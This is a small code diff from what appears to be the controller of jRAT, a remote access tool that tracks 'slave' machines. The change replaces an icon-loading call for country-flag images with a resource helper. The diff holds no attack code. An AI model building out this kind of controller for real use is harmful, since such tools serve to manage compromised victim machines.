@@ -1,6 +1,6 @@
 package jrat.controller.utils;
 
-import iconlib.IconUtils;
+import jrat.api.Resources;
 import jrat.controller.AbstractSlave;
 import jrat.controller.Slave;
 import jrat.controller.ip2c.Country;
@@ -321,7 +321,7 @@ public class FlagUtils {
 
 		ImageIcon icon = null;
 		
-		icon = IconUtils.getIcon("/flags/" + name + ".png", false);
+		icon = Resources.getIcon(name);
 
 		return icon;
 	}
